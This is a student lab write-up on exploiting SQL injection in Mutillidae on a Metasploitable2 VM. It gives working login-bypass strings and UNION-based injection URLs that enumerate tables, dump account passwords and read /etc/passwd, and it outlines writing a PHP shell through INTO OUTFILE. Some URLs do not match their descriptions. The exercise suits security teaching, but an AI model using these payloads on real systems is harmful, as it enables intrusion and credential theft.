## sqlinjection
Exploiting SQL Injection vulnerability

## NAME: K.HEMANATH

## REG: 212223100012

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2

<img width="1896" height="825" alt="image" src="https://github.com/user-attachments/assets/84a8e53d-ee1e-42ba-99cf-fc8ebceeadb7" />


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
Select Multidae from the menu listed as shown above. You will get the page as displayed below:

<img width="1919" height="933" alt="Screenshot 2025-10-10 173922" src="https://github.com/user-attachments/assets/9de9a6d5-d806-4ed0-adb6-d0ca2b8047cc" />

Click on the menu Login/Register and register for an account

<img width="1919" height="926" alt="Screenshot 2025-10-10 173942" src="https://github.com/user-attachments/assets/1f2e57ad-7795-4612-bd60-ad5f561dc6eb" />


Click on the link “Please register here”

<img width="1919" height="928" alt="Screenshot 2025-10-10 173956" src="https://github.com/user-attachments/assets/fb44be9f-6180-4d95-a7c6-3094693f9671" />

<img width="1919" height="1021" alt="Screenshot 2025-10-24 173753" src="https://github.com/user-attachments/assets/fa431775-e197-4bb0-9f66-7ab40ece24c8" />


Click on “Create Account” to display the following page:
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

<img width="1919" height="1021" alt="Screenshot 2025-10-24 173753" src="https://github.com/user-attachments/assets/fa431775-e197-4bb0-9f66-7ab40ece24c8" />



Click “Login”. The logged in page will show as below:


<img width="1919" height="1017" alt="Screenshot 2025-10-24 173937" src="https://github.com/user-attachments/assets/030050c8-4261-4f5c-ae52-f0aa1b0f919d" />


## Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 


Click the login button and you will see it enter into the administrator page.


## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:

<img width="1919" height="1020" alt="Screenshot 2025-10-24 174117" src="https://github.com/user-attachments/assets/f31d7076-0054-45e3-a67f-2f5176df3c1b" />


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

<img width="1919" height="1020" alt="Screenshot 2025-10-24 174117" src="https://github.com/user-attachments/assets/5d6102cd-d24d-4a50-b4db-bd967ed280b7" />


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

(http://10.127.213.79/mutillidae/index.php?page=user-info.php&username=Hemanath'+union+select+1,username,password,is_admin,5+from+accounts%23&password=88888&user-info-php-submit-button=View+Account+Details
)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

<img width="1919" height="923" alt="Screenshot 2025-10-24 182843" src="https://github.com/user-attachments/assets/8da73f6f-9db5-4e51-96e8-8f09d219be9e" />


 As it is having 5 columns the query worked fine and it provides the correct result

<img width="1919" height="923" alt="Screenshot 2025-10-24 182843" src="https://github.com/user-attachments/assets/8da73f6f-9db5-4e51-96e8-8f09d219be9e" />



Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

<img width="1919" height="923" alt="Screenshot 2025-10-24 182843" src="https://github.com/user-attachments/assets/8da73f6f-9db5-4e51-96e8-8f09d219be9e" />


As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

 http://10.127.213.79/mutillidae/index.php?page=user-info.php&username=x'+union+select+1,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details


<img width="1919" height="932" alt="Screenshot 2025-10-24 182930" src="https://github.com/user-attachments/assets/76b7ac21-aa24-4718-8617-3638ca29d188" />


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

(http://10.127.213.79/mutillidae/index.php?page=user-info.php&username=x'+union+select+1,GROUP_CONCAT(table_name),null,null,5+from+information_schema.tables+where+table_schema='owasp10'%23&password=&user-info-php-submit-button=View+Account+Details
)

<img width="1919" height="963" alt="Screenshot 2025-10-24 183249" src="https://github.com/user-attachments/assets/1e9c2aee-3a5f-4e98-b73b-553f1b5e300b" />

<img width="1919" height="887" alt="Screenshot 2025-10-24 183304" src="https://github.com/user-attachments/assets/6cb6d91a-c49a-4f55-a9f8-21154e1615b1" />


The url once executed will  retrieve table names from the “owasp 10” database.
## Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.




The column names of the accounts is displayed below for the following url:

http://10.127.213.79/mutillidae/index.php?page=user-info.php&username=x'+union+select+1,table_name,null,null,5+from+information_schema.tables+where+table_schema='owasp10'%23&password=&user-info-php-submit-button=View+Account+Details







Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://10.127.213.79/mutillidae/index.php?page=user-info.php&username=x'+union+select+1,GROUP_CONCAT(column_name),null,null,5+from+information_schema.columns+where+table_name='accounts'%23&password=&user-info-php-submit-button=View+Account+Details



## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://10.127.213.79/mutillidae/index.php?page=user-info.php&username=Hemanath'+union+select+1,load_file('/etc/passwd'),null,null,5%23&password=88888&user-info-php-submit-button=View+Account+Details


<img width="1918" height="927" alt="image" src="https://github.com/user-attachments/assets/8841fe65-df74-492c-8b96-ffa4fe0374b0" />


the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).




## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
